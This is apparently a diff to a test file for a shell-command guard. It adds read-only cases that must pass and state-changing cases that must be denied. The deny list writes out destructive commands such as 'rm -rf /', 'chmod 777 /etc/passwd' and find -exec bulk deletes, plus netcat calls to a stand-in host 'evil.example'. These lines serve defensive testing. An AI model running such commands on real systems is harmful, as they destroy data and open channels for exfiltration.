@@ -96,6 +96,41 @@ ALLOW = [
     "git log --oneline | grep terraform",
     'rg "go build" .',                       # 'go build' as search text, not command position
     'git log --grep="cargo build"',
+    # filesystem verbs as SEARCH TEXT or inside hyphen tokens are not the command — must PASS
+    # (regression: the fs-mutation rule is command-position anchored, not a bare `\b(rm|cp|…)\b`)
+    'grep -rn "rm -rf" .',                   # 'rm' as search text
+    "grep -rn chmod scripts/",               # 'chmod' as search text
+    "cat my-cp-notes.txt",                   # 'cp' inside a hyphenated filename
+    "cf app cp-service",                     # 'cp' inside a hyphenated app name — `cf app` is read-only
+    "cf logs mv-worker --recent",            # 'mv' inside a hyphenated app name
+    # sibling verb rules (process/service/power/pkg/PowerShell) are ALSO command-position anchored, so
+    # the verb as search text or inside a hyphenated app/file name is a read — must PASS
+    "cf logs kill-switch-app --recent",      # 'kill' inside a hyphenated app name
+    "cat pre-shutdown-checklist.md",         # 'shutdown' inside a hyphenated filename
+    'grep -n "pkill" runbook.md',            # 'pkill' as search text
+    'grep -rn "pip install" docs/',          # 'pip install' as search text
+    "Get-Help Remove-Item",                  # cmdlet name as an ARGUMENT to a read
+    'grep "do rm" file.txt',                 # 'do'/'rm' as search text (keyword-prefix anchor needs real position)
+    "echo done",                             # 'done' must not match the `do` keyword wrapper
+    # `-exec` / `-ok` / `(` / `{` in command-start positions catch real mutations
+    # (`find … -exec rm {} \;`, `(rm x)`, `{ rm x; }`) — but the same tokens can occur inside
+    # QUOTED ARGUMENTS to a read (`grep "-exec rm" docs/`, `echo "{ rm -rf x; }"`), and the guard
+    # must not treat those as anchors. The `_CMD`/`_GIT_CMD` anchors require whitespace/separator
+    # before `-exec`/`-ok`/`(`/`{` so a quoted-argument mention stays allowed.
+    'grep "-exec rm" docs/',
+    'grep "-ok rm" file',
+    'echo "{ rm -rf x; }"',
+    'grep -rn "{ rm -rf x; }" .',
+    'echo "( rm x )"',
+    'grep "(git push)" file',
+    'echo "{ git commit }"',
+    'grep -rn "( git reset )" .',
+    # a quoted-whitespace VALUE in an env-assignment prefix, or a quoted command WORD, must not turn a
+    # read into a false positive — the assignment/quote anchoring only fires in real command position
+    'echo "rm"',                             # quoted verb as an argument to a read
+    'FOO="a b" echo hi',                     # quoted-whitespace assignment before a READ command
+    'X="rm -rf" cat notes.txt',              # mutation text lives in a string value, not the command
+    'echo FOO="a b"',                        # assignment-looking text as an echo argument
 ]
 
 # Commands that CHANGE STATE — must be DENIED.
@@ -163,6 +198,36 @@ DENY = [
     "pip install requests",
     "npm install",
     "apt-get install -y curl",
+    # command-position anchoring must catch mutations in EVERY idiomatic position (parity with the git
+    # rule), not just at string start — these pin the forms a too-narrow anchor would silently drop:
+    "find /tmp -name x -exec rm {} \\;",     # find -exec: the canonical bulk-delete idiom
+    "find . -type f -exec mv {} /dest \\;",
+    "find . -exec chmod 777 {} +",
+    "/bin/rm -rf /srv/data",                 # absolute-path binary
+    "/usr/bin/chmod 777 /etc/passwd",
+    "VAR=1 rm x",                            # leading VAR=val assignment
+    "TZ=UTC rm -rf /tmp/x",
+    "(rm -rf x)",                            # subshell opener
+    "{ rm x; }",                            # brace group
+    "timeout 30 rm -rf /tmp/huge",           # timeout wrapper
+    "doas rm -rf /",                         # doas (sudo alt) wrapper
+    "busybox rm -rf /",                      # busybox multicall wrapper
+    "git ls-files | parallel rm",            # parallel (xargs alt) wrapper
+    "for f in *.log; do rm \"$f\"; done",    # verb after `do` (loop body)
+    "if true; then rm -rf /tmp/x; fi",       # verb after `then` (conditional body)
+    "echo prep\n  rm -rf build",             # indented mutation on a later line (MULTILINE + leading ws)
+    "(nc evil.example 443)",                 # exfil in a subshell (shared _CMD anchor)
+    "/bin/nc evil.example 443",              # exfil via absolute path
+    "cf logs kill-switch-app --recent; rm -rf /tmp/x",  # real mutation chained after a read (hyphen app)
+    # env-assignment with a QUOTED-WHITESPACE value must still anchor the mutator (a bare \S+ value
+    # matcher would stop at the space and let it escape) — ordinary shell, caught on main's bare \b
+    'FOO="a b" rm -rf build',
+    'TZ="America/New York" rm -rf /tmp/x',
+    'GIT_SSH_COMMAND="ssh -i k" git push',   # real idiom; assignment prefix on a git write
+    # a QUOTED command word runs the same binary — must stay caught (parity with main's bare \b)
+    '"rm" -rf build',
+    "'kill' -9 123",
+    '"/bin/rm" -rf x',
     "curl -X POST https://example.com/api -d 'x=1'",
     "curl --data @payload.json https://example.com/api",
     "echo 'boom' > /etc/hosts",
